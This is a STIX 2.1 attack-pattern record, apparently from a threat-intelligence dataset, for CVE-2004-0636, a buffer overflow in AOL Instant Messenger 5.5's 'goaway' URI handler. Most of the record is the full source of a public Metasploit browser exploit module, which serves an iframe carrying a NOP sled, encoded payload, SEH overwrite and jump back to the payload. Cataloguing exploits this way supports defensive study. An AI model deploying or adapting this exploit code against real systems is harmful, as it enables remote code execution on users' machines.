{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2496ec58-4add-4db2-a6d1-3b6df58c0ff7",
    "created": "2024-08-14T16:41:27.813595Z",
    "modified": "2024-08-14T16:41:27.813599Z",
    "name": "AOL Instant Messenger goaway Overflow",
    "description": " This module exploits a flaw in the handling of AOL Instant Messenger's 'goaway' URI handler.  An attacker can execute arbitrary code by supplying an overly sized buffer as the 'message' parameter.  This issue is known to affect AOL Instant Messenger 5.5.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/aim_goaway.rb",
            "external_id": "aim_goaway.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0636"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=121&type=vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module acts as an HTTP server and exploits an SEH overwrite\n  #\n  include Msf::Exploit::Seh\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AOL Instant Messenger goaway Overflow',\n      'Description'    => %q{\n          This module exploits a flaw in the handling of AOL Instant\n        Messenger's 'goaway' URI handler.  An attacker can execute\n        arbitrary code by supplying an overly sized buffer as the\n        'message' parameter.  This issue is known to affect AOL Instant\n        Messenger 5.5.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'skape',\n          'thief <thief[at]hick.org>'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2004-0636' ],\n          [ 'OSVDB', '8398'    ],\n          [ 'BID', '10889'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=121&type=vulnerabilities' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1014,\n          'MaxNops'  => 1014,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          # Target 0: Automatic\n          [\n            'Windows NT/2000/XP/2003 Automatic',\n            {\n              'Platform' => 'win',\n              'Rets'     =>\n                [\n                  0x1108118f, # proto.com: pop/pop/ret\n                ],\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2004-08-09'))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Build out the message\n    msg =\n      make_nops(1014 - p.encoded.length) +     # NOP sled before the payload\n      p.encoded +                              # store the payload\n      generate_seh_record(target['Rets'][0]) + # set up the SEH frame\n      \"\\x90\\xe9\\x13\\xfc\\xff\\xff\"               # jmp -1000\n\n    # Build the HTML content\n    content = \"<html><iframe src='aim:goaway?message=#{msg}'></html>\"\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-08-09",
    "x_mitre_platforms": [
        "win'"
    ]
}